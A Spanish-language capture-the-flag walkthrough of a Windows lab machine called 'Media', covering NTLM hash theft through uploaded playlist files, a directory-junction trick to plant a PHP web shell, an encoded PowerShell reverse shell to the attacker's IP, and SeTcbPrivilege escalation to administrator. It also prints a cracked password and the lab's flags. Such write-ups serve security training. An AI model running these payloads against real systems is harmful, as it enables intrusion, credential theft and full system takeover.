# Máquina: Media

- **Sistema Operativo:** Windows
- **Dificultad:** Media
- **Técnicas clave:** Windows Media Player Playlist Abuse, NTLM Theft, Directory Junctions, Web Shell Upload, SeTcbPrivilege Abuse, Local Privilege Escalation

---

![Media](assets/Pasted%20image%2020260922225710.png)

## Fase 1: Reconocimiento y Enumeración

Iniciamos con un escaneo exhaustivo de puertos utilizando Nmap:

```bash
sudo nmap -sVC --min-rate 5000 -n -Pn -sS 10.129.234.67 -oN escaneo
```

![Escaneo Nmap](assets/Pasted%20image%2020260922225941.png)

Al revisar los puertos abiertos, accedemos al servicio web en el puerto 80:

![Sitio Web](assets/Pasted%20image%2020260922230533.png)

Al final de la página web encontramos un formulario de subida de archivos para candidatos de trabajo:

![Formulario de subida](assets/Pasted%20image%2020260922230857.png)

La descripción de la función de subida indica que el video debe ser compatible con **Windows Media Player**.

Investigando sobre vectores de ataque en Windows Media Player encontramos referencias sobre abuso de listas de reproducción y DRM:

* [Hackers abuse Windows Media Player DRM](https://www.enigmasoftware.com/hackers-abuse-windows-media-players-drm-again/)
* [Microsoft Support - File types supported by Windows Media Player](https://support.microsoft.com/en-us/windows/apps/windowsmediaplayer/file-types-supported-by-windows-media-player)

Una búsqueda rápida de tipos de archivos compatibles nos revela extensiones como:
- `.wax`: Lista de reproducción de audio de Windows Media (se abre por defecto con Windows Media Player).
- `.asx`: Lista de reproducción de Windows Media (se abre por defecto con este programa).
- `.m3u`: Lista de reproducción estándar.

Utilizamos la herramienta **[ntlm_theft](https://github.com/Greenwolf/ntlm_theft)** para generar archivos de prueba que fuercen una petición SMB saliente hacia nuestra máquina atacante:

```bash
python3 ntlm_theft.py -g all -s 10.10.14.240 -f leak
```

![Generación con ntlm_theft](assets/Pasted%20image%2020260923000213.png)

Seleccionamos el archivo `.asx` o `.wax` y lo subimos a través del formulario:

![Subida de archivo](assets/Pasted%20image%2020260923000615.png)

![Confirmación de subida](assets/Pasted%20image%2020260923000648.png)

Iniciamos `Responder` en nuestra máquina y, en cuanto el backend procesa el archivo, capturamos el hash NTLMv2 del usuario `enox`:

![Captura Responder](assets/Pasted%20image%2020260923000748.png)

Guardamos el hash en `hash.txt` y procedemos a crackearlo con Hashcat utilizando el diccionario `rockyou.txt`:

```bash
hashcat -m 5600 hash.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

![Hashcat cracking](assets/Pasted%20image%2020260923000949.png)

![Contraseña crackeada](assets/Pasted%20image%2020260923001019.png)

La contraseña obtenida es: `1234virus@`.

## Acceso Inicial (User)

Con las credenciales obtenidas nos conectamos a la máquina objetivo mediante SSH:

```bash
ssh enox@10.129.234.67
```

Capturamos la flag de usuario (`user.txt`):

```text
50ef928b31ae02ac8a23af8422ce7f60
```

![User Flag](assets/Pasted%20image%2020260923001322.png)

## Enumeración Interna y Análisis del Código Web

Inspeccionando el sistema de archivos encontramos la estructura de la aplicación web:

![Estructura web](assets/Pasted%20image%2020260923001648.png)

![Archivos web](assets/Pasted%20image%2020260923001705.png)

Revisamos el código fuente de `index.php`:

![Ruta index.php](assets/Pasted%20image%2020260923001801.png)

El fragmento relevante de `index.php` que maneja la subida es:

```php
<?php
error_reporting(0);

$uploadDir = 'C:/Windows/Tasks/Uploads/';

if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES["fileToUpload"])) {
    $firstname = filter_var($_POST["firstname"], FILTER_SANITIZE_STRING);
    $lastname  = filter_var($_POST["lastname"], FILTER_SANITIZE_STRING);
    $email     = filter_var($_POST["email"], FILTER_SANITIZE_STRING);

    // 1. Genera un nombre de carpeta = MD5(firstname + lastname + email)
    $folderName = md5($firstname . $lastname . $email);
    $targetDir  = $uploadDir . $folderName . '/';

    if (!file_exists($targetDir)) {
        mkdir($targetDir, 0777, true);
    }

    // 2. Sanitiza el nombre del archivo
    $originalFilename  = $_FILES["fileToUpload"]["name"];
    $sanitizedFilename = preg_replace("/[^a-zA-Z0-9._]/", "", $originalFilename);

    $targetFile = $targetDir . $sanitizedFilename;
    move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $targetFile);
}
?>
```

### Vulnerabilidades Identificadas:
1. **Ruta de subida predecible**: El nombre de la carpeta destino es `MD5(firstname . lastname . email)`, valores que el atacante controla directamente en el formulario.
2. **Permisos débiles en el directorio de subidas**: Al revisar la carpeta creada, los permisos permiten modificarla.

Calculamos el hash MD5 localmente en PowerShell con los valores que enviaremos:

```powershell
$firstname="javik";$lastname="javik";$email="test@test.com";([System.BitConverter]::ToString([System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($firstname+$lastname+$email))) -replace '-','').ToLower()
```

![Cálculo de Hash](assets/Pasted%20image%2020260923002351.png)

Verificamos la carpeta generada en `C:\Windows\Tasks\Uploads\` y revisamos sus permisos con `icacls`:

```cmd
ls C:\Windows\Tasks\Uploads\
```

```cmd
icacls C:\Windows\Tasks\Uploads\279bf0ac566efcbd361fd9186035287d
```

![Permisos icacls](assets/Pasted%20image%2020260923002514.png)

Observamos que el grupo `Everyone` tiene control total `(I)(OI)(CI)(F)`, lo que permite al usuario `enox` eliminar la carpeta y reemplazarla por un **directory junction** hacia el directorio web de XAMPP:

**Paso 1: Borrar la carpeta hash:**
```cmd
rmdir C:\Windows\Tasks\Uploads\279bf0ac566efcbd361fd9186035287d
```

**Paso 2: Crear el Junction hacia `C:\xampp\htdocs`:**
```cmd
cmd /c mklink /J C:\Windows\Tasks\Uploads\279bf0ac566efcbd361fd9186035287d C:\xampp\htdocs
```

Verificamos el junction:

```cmd
ls C:\Windows\Tasks\Uploads\279bf0ac566efcbd361fd9186035287d
```

![Verificación de Junction](assets/Pasted%20image%2020260923002928.png)

## Ejecución Remota de Comandos (RCE)

Al subir cualquier archivo a través del formulario con los mismos datos (`javik`, `javik`, `test@test.com`), se guardará directamente dentro de `C:\xampp\htdocs`.

Creamos una web shell simple en PHP:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Subimos `shell.php` mediante el formulario y comprobamos ejecución remota vía HTTP:

```bash
curl "http://10.129.234.67/shell.php?cmd=whoami"
```

![Test Web Shell](assets/Pasted%20image%2020260923003149.png)

Para obtener una reverse shell interactiva, preparamos un payload en PowerShell codificado en Base64:

```bash
IP="10.10.14.240"
PORT="4444"
CMD="\$client = New-Object System.Net.Sockets.TCPClient('$IP',$PORT);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbackByte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbackByte,0,\$sendbackByte.Length);\$stream.Flush()};\$client.Close()"
ENCODED=$(echo -n "$CMD" | iconv -t utf-16le | base64 -w0)
echo "$ENCODED"
```

![Base64 Encoded](assets/Pasted%20image%2020260923003528.png)

Disparamos la petición para conectar la reverse shell:

```bash
curl -G "http://10.129.234.67/shell.php" --data-urlencode "cmd=powershell -nop -w hidden -enc $ENCODED"
```

Recibimos la conexión en nuestro listener de Netcat:

![Reverse Shell Recibida](assets/Pasted%20image%2020260923003606.png)

## Escalada de Privilegios (Root)

Comprobamos los privilegios asignados al proceso de la web shell con `whoami /priv`:

![Privilegios whoami](assets/Pasted%20image%2020260923003732.png)

Identificamos el privilegio **`SeTcbPrivilege`** habilitado en la cuenta del servicio web.

### Abuso de SeTcbPrivilege con `tcb.exe`

`SeTcbPrivilege` permite actuar como parte del sistema operativo y crear tokens arbitrarios. Utilizamos la herramienta **`tcb.exe`** del proyecto [tcb-lpe](https://github.com/CharminDoge/tcb-lpe) para ejecutar comandos con privilegios de `NT AUTHORITY\SYSTEM`.

Descargamos el binario en la máquina atacante:

```bash
wget https://github.com/CharminDoge/tcb-lpe/releases/download/v1.0.0/tcb.exe
```

Iniciamos un servidor HTTP temporal con Python:

```bash
python3 -m http.server 8000
```

Desde la máquina víctima descargamos `tcb.exe` y lo ejecutamos para agregar al usuario `enox` al grupo local de Administradores:

```powershell
Invoke-WebRequest -Uri http://10.10.14.240:8000/tcb.exe -OutFile C:\Windows\Temp\tcb.exe
```

```cmd
C:\Windows\Temp\tcb.exe "C:\Windows\system32\cmd.exe /c net localgroup administrators enox /add"
```

![Ejecución tcb.exe](assets/Pasted%20image%2020260923004525.png)

Verificamos que el usuario `enox` ahora forme parte del grupo `Administrators`:

![Verificación Administradores](assets/Pasted%20image%2020260923004615.png)

Cerramos la sesión y nos volvemos a conectar por SSH con `enox`. Ahora disponemos de permisos administrativos completos para leer la flag de root en `C:\Users\Administrator\Desktop\root.txt`:

![Root Flag](assets/Pasted%20image%2020260923004855.png)

```text
0079a733e409c584d0880617e96b7937
```
